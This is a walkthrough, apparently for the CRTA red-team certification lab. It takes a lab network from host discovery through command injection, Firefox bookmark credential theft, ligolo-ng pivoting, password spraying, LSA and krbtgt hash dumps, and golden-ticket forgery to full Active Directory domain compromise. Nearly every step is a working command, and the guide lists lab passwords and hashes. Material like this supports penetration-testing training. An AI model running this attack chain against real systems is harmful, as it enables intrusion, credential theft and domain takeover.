# CRTA Guide

## Initial Access to Linux Web Server

### Host Discovery

Scanning available host

```bash
nmap -sn 192.168.80.0/24
```



### Port Scanning

```bash
nmap -sC -sV 192.168.80.10
```



### Web Enumeration

Now sign in to the site and using **Burp Proxy** (HTTP history) navigate through the website to discover interesting request.

Then, check the possible Command Execution in the all website input field.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

First, check the /etc/passwd file for possible clear-text credentials or hash of other priv users.

Otherwise get a Reverse shell (Python, Bash, ...)



## Linux Machine Enumeration

### Network configuration

Now, we can check the machine's network configuration to look up for another network interface.

```bash
ifconfig
```

### Mozilla Firefox History/Bookmarks

If there is Mozilla Firefox installed for this user we can try to extract the history and bookmarks looking for other interesting informations.

```bash
ls -la .mozilla/
cd .mozilla/firefox/...default-release

sqlite3 places.sqlite
.tables
SELECT * FROM moz_bookmarks;
```

We can found credentials and more. If we found some creds let's to the next step.



## Pivoting from DMZ to Internal Network

We have to perform pivoting as `192.168.98.0/24` is not directly accessible&#x20;from the VPN network. We will utilize ligolo-ng for the same.

<pre class="language-bash"><code class="lang-bash"># Attacker machine, download proxy &#x26; agent

#Proxy
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_pr
oxy_0.4.3_Linux_64bit.tar.gz
<strong>
</strong><strong>#Agent
</strong>wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_ag
ent_0.4.3_Linux_64bit.tar.gz

# host the directory to trasfer file into target machine
python3 -m http.server 8080
</code></pre>

Transfer and set up all in the target machine

<pre class="language-bash"><code class="lang-bash"><strong># Target Machine
</strong><strong>
</strong><strong>wget http://10.10.200.56:80/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
</strong>tar -xvzf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
</code></pre>

Now, setup the attacker machine with ligolo-ng proxy

```bash
# Attacker Machine

sudo ip tuntap add user <YOUR_USER> mode tun ligolo

# Delete the 192.168.98.0/24 IP Range from the tun0 interface :
sudo ip route del 192.168.98.0/24 dev tun0

# Up the ligolo interface:
sudo ip link set ligolo up

# Add 192.168.98.0/24 IP range to the ligolo interface:
sudo ip route add 192.168.98.0/24 dev ligolo

# Check if the route has been added
ip route
```

Then, start the proxy server

```bash
# Attacker machine

./proxy -selfcert -laddr 0.0.0.0:443
```

And lastly connect the agent into target machine to the server into attacker machine

<pre class="language-bash"><code class="lang-bash"><strong># Target machine
</strong><strong>
</strong><strong>./agent -connect 10.10.200.X:443 -ignore-cert
</strong></code></pre>

When the connection has been initialized, start the tunnel from ligolo interface on attacker machine.

```bash
# Ligolo interface on attacker machine

session # (select the current connection)
start
```

Now we can ping the network 192.168.98.0/24

```bash
ping 192.168.98.15
```



## Initial Access to Windows Machine/DC

Scan the pivoting network with nmap or arpscan

```bash
# nmap scan
nmap -sn 192.168.98.0/24

# arp scan
netdiscover -i INTERFACE -r IP/MASK
```



### Password Spray with found credentials

With the AD credentials found in the Firefoz Bookmarks we can try to perform a password spray to host discovered.

{% code title="target.txt" %}
```
# create a file with all host discovered
192.168.98.2
192.168.98.15
192.168.98.30
192.168.98.120
```
{% endcode %}

Perform the spray with Crackmapexec

```bash
crackmapexec --verbose smb target.txt -u john -p 'User1@#$%6'
```

If we get a result with `(Pwn3d!)` writing, it mean that this user is local administrator at the machine.



### Windows Machine dump credentials

Now we can perform a dump of credentials stored in that machine.

```bash
crackmapexec --verbose smb 192.168.98.30 -u john -p 'User1@#$%6' --lsa
```

Then if we will find other credentials we can repeform a password spray.

```bash
crackmapexec --verbose smb target.txt -u corpmngr -p 'User4&*&*'
```

If we get a result with `(Pwn3d!)` writing, it mean that this user is local administrator at the machine.

Since we know the machine name & the domain, let’s update the same on&#x20;our `/etc/hosts` file.

```bash
sudo nano /etc/hosts

192.168.98.2 warfare.corp dc01.warfare.corp
192.168.98.120 child.warfare.corp cdc.child.warfare.corp
```



### Craft a Golden Ticket

#### Get KRBTGT Hash

We are local administrator in the Child Domain Controller. Let's extract the&#x20;hash of “**krbtgt**” account using `impacket-secretsdump` tool. We will forge&#x20;a golden ticket to compromise the Parent Domain Controller.

{% code overflow="wrap" %}
```bash
impacket-secretdump -debug child/corpmngr:'User4&*&*'@cdc.child.warfare.corp -just-dc-user 'child\krbtgt'

# Results:

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900

krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
```
{% endcode %}

#### Get SID of the Child and Parent DC

Using `impacket-lookupsid` tool we will extract DC SIDs

```bash
impacket-lookupsid child/corpmngr:'User4&*&*'@child.warfare.corp

impacket-lookupsid child/corpmngr:'User4&*&*'@warfare.corp
```

#### Forge the ticket

Using `impacket-ticketer` tool we will craft the golden ticket.

{% code overflow="wrap" %}
```bash
impacket-ticketer -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid $CHILD_DC_SID -groups 516 -user-id 1106 -extra-sid $PARENT_DC_SID,S-1-5-9 'corpmngr'
```
{% endcode %}

Now we have the `.ccache` file. Let's set it to the env variable

```bash
export KRB5CCNAME=corpmngr.ccache
```



### Get Service Ticket with .ccache file

Now using impacket-getST we can request Service Ticket using ccache file.

{% code overflow="wrap" %}
```bash
impacket-getST -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corpmngr -debug
```
{% endcode %}

Now set the new Ticket just created to our env variable

```bash
export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
```



## Parent Domain Controller Compromise

We got the CIFS ticket of the Domain Controller as “**corpmngr**”, let’s extract&#x20;the **Administrator password** using `impacket-secretsdump` tool.

{% code overflow="wrap" %}
```bash
impacket-secretsdump -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\Administrator' -debug
```
{% endcode %}

If it works, we can use the Administrator hash to access through SMB using `impacket-psexec`&#x20;

{% code overflow="wrap" %}
```bash
impacket-psexec -debug 'warfare/Administrator@dc01.warfare.corp' -hashes aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60
```
{% endcode %}

Now we have comprimise the Entire Domain. ;)
